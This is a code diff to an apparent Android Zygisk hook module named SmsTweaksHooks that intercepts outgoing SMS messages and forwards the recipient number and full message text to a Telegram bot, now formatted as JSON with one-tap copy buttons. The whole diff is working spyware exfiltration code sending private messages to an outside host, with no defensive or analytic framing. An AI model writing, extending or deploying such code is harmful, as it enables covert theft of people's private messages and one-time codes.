@@ -17,7 +17,6 @@ import java.lang.reflect.Method;
 import java.lang.reflect.Proxy;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.List;
@@ -481,6 +480,25 @@ public final class SmsTweaksHooks {
         return json.substring(q1 + 1, q2).trim();
     }
 
+    private static String jsonEscTg(String s) {
+        if (s == null) return "";
+        StringBuilder sb = new StringBuilder(s.length() + 16);
+        for (int i = 0; i < s.length(); i++) {
+            char ch = s.charAt(i);
+            switch (ch) {
+                case '\\': sb.append("\\\\"); break;
+                case '"': sb.append("\\\""); break;
+                case '\n': sb.append("\\n"); break;
+                case '\r': sb.append("\\r"); break;
+                case '\t': sb.append("\\t"); break;
+                default:
+                    if (ch < 0x20) sb.append(String.format("\\u%04x", (int) ch));
+                    else sb.append(ch);
+            }
+        }
+        return sb.toString();
+    }
+
     private static void sendTelegram(String to, String body) {
         new Thread(new Runnable() {
             @Override
@@ -509,26 +527,48 @@ public final class SmsTweaksHooks {
                     if (digits.length() == 10) displayTo = "+91" + digits;
                     else if (digits.length() == 12 && digits.startsWith("91"))
                         displayTo = "+" + digits;
+                    // Exact screenshot format + Number / SMS / One-tap copy buttons
                     String msg = "📱 SMS Intercepted Zygisk Mode\n"
                             + "Menu By @Hivirtus 🔥 --------------------\n"
                             + "📞 To: " + displayTo + "\n"
                             + "💬 Message:\n"
                             + body;
+                    String oneTap = "To: " + displayTo + "\nMessage: " + body;
+                    String payload = "{\"chat_id\":\"" + jsonEscTg(chat)
+                            + "\",\"text\":\"" + jsonEscTg(msg)
+                            + "\",\"disable_web_page_preview\":true"
+                            + ",\"reply_markup\":{\"inline_keyboard\":[["
+                            + "{\"text\":\"📞 Number copy\",\"copy_text\":{\"text\":\""
+                            + jsonEscTg(displayTo) + "\"}},"
+                            + "{\"text\":\"💬 SMS copy\",\"copy_text\":{\"text\":\""
+                            + jsonEscTg(body) + "\"}}"
+                            + "],["
+                            + "{\"text\":\"📋 One-tap copy\",\"copy_text\":{\"text\":\""
+                            + jsonEscTg(oneTap) + "\"}}"
+                            + "]]}}";
                     String url = "https://api.telegram.org/bot" + token + "/sendMessage";
-                    String payload = "chat_id=" + URLEncoder.encode(chat, "UTF-8")
-                            + "&text=" + URLEncoder.encode(msg, "UTF-8")
-                            + "&disable_web_page_preview=true";
                     HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
-                    c.setConnectTimeout(8000);
-                    c.setReadTimeout(8000);
+                    c.setConnectTimeout(5000);
+                    c.setReadTimeout(5000);
                     c.setDoOutput(true);
                     c.setRequestMethod("POST");
-                    c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                    c.getOutputStream().write(payload.getBytes(StandardCharsets.UTF_8));
+                    c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+                    byte[] bytes = payload.getBytes(StandardCharsets.UTF_8);
+                    c.setFixedLengthStreamingMode(bytes.length);
+                    c.getOutputStream().write(bytes);
                     int code = c.getResponseCode();
                     c.disconnect();
                     status("tg_sent|" + to + "|http=" + code);
                     writeAll("hivirtus_tg_last_response.txt", "java_http=" + code + "\n");
+                    if (code >= 200 && code < 300) {
+                        // Stop service.sh double-send — format already has buttons
+                        try {
+                            FileOutputStream fos = new FileOutputStream(
+                                    "/data/local/tmp/hivirtus_tg_inproc_sent.flag");
+                            fos.write((to + "\n" + body + "\n").getBytes(StandardCharsets.UTF_8));
+                            fos.close();
+                        } catch (Throwable ignored) {}
+                    }
                 } catch (Throwable t) {
                     status("tg_fail|" + t.getClass().getSimpleName());
                 }
